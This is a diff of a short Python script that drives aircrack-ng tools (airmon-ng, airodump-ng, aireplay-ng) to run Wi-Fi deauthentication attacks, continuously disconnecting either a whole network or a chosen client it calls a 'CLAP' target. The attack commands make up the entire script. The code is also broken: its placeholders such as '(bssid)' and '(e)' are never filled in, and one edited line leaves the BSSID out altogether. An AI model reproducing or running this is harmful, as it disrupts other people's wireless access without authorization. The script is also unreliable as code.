@@ -5,10 +5,10 @@ os.system("airmon-ng start wlan0")
 os.system("airodump-ng wlan0mon")
 x = raw_input('enter the bssid that you want to CLAP!:')
 e = int(input('enter the channel of the channel you wanna CLAP!:'))
-os.system("airodump-ng --channel %s --bssid %s wlan0mon")
-aireplay = input("do you want to clap the entire network or just a client? Network/Client")
-if aireplay is 'Network':
-  os.system("aireplay-ng -0 0 -a (bssid) wlan0mon")
+os.system("airodump-ng --channel (e) --bssid (x) wlan0mon")
+aireplay = raw_input("do you want to clap the entire network or just a client? Network/Client")
+if aireplay == 'Network':
+  os.system("aireplay-ng -0 0 -a  wlan0mon")
 else:
   aireplay_client = input("enter the client you wanna CLAP:")
   os.system("aireplay-ng -0 0 -a (bssid) -c (aireplay_client) wlan0mon")
